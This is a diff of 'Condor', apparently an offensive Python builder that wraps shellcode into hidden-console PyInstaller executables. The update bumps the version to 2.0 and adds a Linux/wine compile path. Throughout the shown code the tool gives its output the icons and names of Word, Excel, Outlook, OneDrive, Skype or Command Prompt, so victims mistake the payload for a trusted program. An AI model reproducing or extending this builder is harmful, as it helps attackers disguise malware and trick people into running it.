@@ -6,6 +6,7 @@ import random
 import os
 import shutil
 from colorama import Fore
+import platform
 
 def banner():
     print(f'''{Fore.RED}
@@ -20,7 +21,7 @@ def banner():
     ░ ░          ░ ░           ░    ░        ░ ░     ░     
     ░                             ░                        
 
-                        {Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}Condor v1.0{Fore.LIGHTRED_EX}]
+                        {Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}Condor v2.0{Fore.LIGHTRED_EX}]
                     {Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}Developed by MrEmpy{Fore.LIGHTRED_EX}]
 
 ''')
@@ -149,6 +150,44 @@ def compile(key, scname, exename):
         scname = 'Command Prompt'
     subprocess.call(f'pyinstaller.exe --onefile --noconsole --distpath . -i {icon} -n "{scname}" --key={key} workbench/{exename}.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+def linuxcompile(key, scname, exename):
+    current_user = os.getlogin()
+    if scname == False:
+        icon = 'icons/cmd.ico'
+        scname = 'Command Prompt'
+
+    if scname == 'cmd':
+        icon = 'icons/cmd.ico'
+        scname = 'Command Prompt'
+
+    elif scname == 'excel':
+        icon = 'icons/excel.ico'
+        scname = scname.capitalize()
+    elif scname == 'onedrive':
+        icon = 'icons/onedrive.ico'
+        scname = scname.capitalize()
+    elif scname == 'onenote':
+        icon = 'icons/onenote.ico'
+        scname = scname.capitalize()
+    elif scname == 'outlook':
+        icon = 'icons/outlook.ico'
+        scname = scname.capitalize()
+    elif scname == 'powerpoint':
+        icon = 'icons/powerpoint.ico'
+        scname = 'Power Point'
+    elif scname == 'skype':
+        icon = 'icons/skype.ico'
+        scname = scname.capitalize()
+    elif scname == 'word':
+        icon = 'icons/word.ico'
+        scname = scname.capitalize()
+    else:
+        icon = 'icons/cmd.ico'
+        scname = 'Command Prompt'
+    print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Compile using the command:')
+    print(f'wine "/home/{current_user}/.wine/drive_c/users/{current_user}/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe" --onefile --noconsole --distpath {os.getcwd()}/ -i {os.getcwd()}/{icon} -n "{scname}" --key={key} {os.getcwd()}/workbench/{exename}.py')
+    #os.system(f'wine "/home/{current_user}/.wine/drive_c/users/{current_user}/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe" --onefile --noconsole --distpath {os.getcwd()}/ -i {os.getcwd()}/{icon} -n "{scname}" --key={key} {os.getcwd()}/workbench/{exename}.py') #, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+
 def custompayload():
     print(f'{Fore.LIGHTRED_EX}[-]{Fore.LIGHTWHITE_EX} This feature will be added in the future')
     return
@@ -230,10 +269,10 @@ def main():
         shellcode()
         exeprotection(exerandname)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode shield created!')
-        wslinput = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Would you like to compile the script? For that you need to be running this script in a WSL environment. If you\'re on linux, you won\'t be able to compile it. [y/N] ')
-        if wslinput == 'y':
+        current_system = platform.system()
+        if current_system == "Linux":
             print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Compiling...')
-            compile(key, arguments.icon, exerandname)
+            linuxcompile(key, arguments.icon, exerandname)
             try:
                 cleanuptrash(exerandname, arguments.icon)
             except:
@@ -254,10 +293,10 @@ def main():
         shellcode()
         exeprotection(exerandname)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode shield created!')
-        wslinput = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Would you like to compile the script? For that you need to be running this script in a WSL environment. If you\'re on linux, you won\'t be able to compile it. [y/N] ')
-        if wslinput == 'y':
+        current_system = platform.system()
+        if current_system == "Linux":
             print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Compiling...')
-            compile(key, False, exerandname)
+            linuxcompile(key, False, exerandname)
             try:
                 cleanuptrash2(exerandname)
             except:
